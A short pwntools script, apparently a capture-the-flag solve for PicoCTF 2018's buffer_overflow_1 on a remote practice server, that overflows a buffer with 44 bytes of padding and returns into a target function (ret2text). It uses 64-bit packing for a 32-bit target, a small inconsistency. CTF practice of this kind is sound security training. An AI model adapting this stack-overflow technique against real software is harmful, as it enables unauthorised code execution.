#Made by fly_autumn
#x86 ret2text
from pwn import *
#p = process("./PicoCTF_2018_buffer_overflow_1")
p = remote("node5.buuoj.cn",29445)
elf = ELF("./PicoCTF_2018_buffer_overflow_1")
context(os="linux",arch="i386")

func_plt = 0x80485cb
offset = 44
payload = b"\x00" * offset + p64(func_plt)
p.sendline(payload)
#我的评价是敌人都是纸老虎

p.interactive()
